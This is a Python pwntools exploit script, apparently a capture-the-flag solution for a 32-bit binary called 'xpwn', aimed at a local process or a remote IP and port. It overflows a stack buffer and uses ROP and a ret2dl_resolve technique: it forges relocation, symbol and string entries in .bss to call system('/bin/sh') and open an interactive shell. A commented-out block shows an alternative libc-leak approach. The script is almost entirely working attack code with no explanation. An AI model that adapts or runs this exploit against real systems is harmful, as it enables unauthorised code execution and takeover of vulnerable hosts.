#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.terminal=["tmux","splitw","-h"]
debug = 1
local = 1

if local:
    a=process("./xpwn")
    libc=ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    a=remote("116.85.48.105","5005")
    libc=ELF("./libc.so.6")
if debug:
    gdb.attach(a,''' 
    b *0x8048722
    ''')
elf=ELF("./xpwn")
savedecx_offset=0x44
pop3_ret=0x080487a9
start_addr=0x80484E0
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
read_plt=elf.plt["read"]
rel_plt_addr=0x80483a0
dynsym_addr=0x80481d8
dynstr_addr=0x80482c8
plt0_addr=0x8048420

bss_addr=elf.bss()+0x20

fake_rel_plt_addr=bss_addr

arg_offset=fake_rel_plt_addr - rel_plt_addr#dl_reslove(linkmap,arg_offset)

fake_dynsym_addr=fake_rel_plt_addr + 0x8   #fake_dynsym address

align=16-(fake_dynsym_addr-dynsym_addr)%16  #align
fake_dynsym_addr+=align                 

r_info=(((fake_dynsym_addr-dynsym_addr)/16)<<8)|0x7 #rel_plt's r_info

fake_dynstr_addr=fake_dynsym_addr+16   
sh_addr=fake_dynstr_addr + 7
offset=fake_dynstr_addr-dynstr_addr

def init():
    a.recvuntil("Enter username: ")
    a.sendline("a")
    a.recvuntil("password: ")
    a.sendline("-1")
    a.recvuntil(": ")
init()
payload=""
payload+=p32(read_plt)
payload+=p32(pop3_ret)
payload+=p32(0)
payload+=p32(bss_addr)
payload+=p32(0x100)
payload+=p32(plt0_addr)
payload+=p32(arg_offset)
payload+=p32(pop3_ret)
payload+=p32(sh_addr)
payload=payload.ljust(0x44,'\x00')
payload+='\x40'
a.send(payload)
a.recv()
'''
a.send(payload)
a.recvuntil("All done, bye!\n")
puts_addr=u32(a.recv(4))
success("puts_addr ==> 0x%x"%puts_addr)
libc_base=puts_addr-libc.symbols["puts"]
system_addr=libc_base+libc.symbols["system"]
sh_addr=libc_base+next(libc.search("/bin/sh"))
init()
payload=""
payload+=p32(system_addr)
payload+=p32(start_addr)
payload+=p32(sh_addr)
payload=payload.ljust(0x44,'\x00')
payload+='\x40'
a.send(payload)
a.recvuntil("All done, bye!\n")
a.interactive()
'''
pause()

payload=p32(elf.got["read"])#fake_rel_plt
payload+=p32(r_info)
payload+='A'*align     #padding
payload+=p32(offset)+p32(0)+p32(0)+p32(0x12) #fake dynsym
payload+="system\x00" #fake dynstr
payload+="/bin/sh\x00"
a.sendline(payload)
a.interactive()
